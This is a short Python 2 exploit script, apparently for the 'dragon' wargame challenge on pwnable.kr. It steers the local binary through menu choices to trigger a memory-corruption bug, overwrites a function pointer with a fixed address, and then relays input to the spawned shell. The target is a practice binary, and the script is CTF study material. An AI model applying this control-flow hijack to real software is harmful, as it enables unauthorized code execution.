import subprocess
import sys
import struct
import fcntl
import time
import os

def read_until(word):
    output= ''
    while word not in output:
        output = p.stdout.readline()
        sys.stdout.write(output)

p = subprocess.Popen(['/home/raw/Documents/pwnable/rookis/dragon/dragon'], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

read_until('Knight')

p.stdin.write('2\n')

read_until('Knight')

p.stdin.write('2\n')

read_until('Knight')

p.stdin.write('1\n')

for i in range(0,4):
    read_until('Priest')
    p.stdin.write('3\n')
    read_until('Priest')
    p.stdin.write('3\n')
    read_until('Priest')
    p.stdin.write('2\n')

read_until('Remember')

p.stdin.write(struct.pack('<I', 0x08048dbf))

#p.communicate()

fd = p.stdout.fileno()
fl = fcntl.fcntl(fd, fcntl.F_GETFL)
fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

while(True):
    try:
        time.sleep(0.1)
        print p.stdout.read()
    except:
       p.stdin.write(raw_input() + '\n')

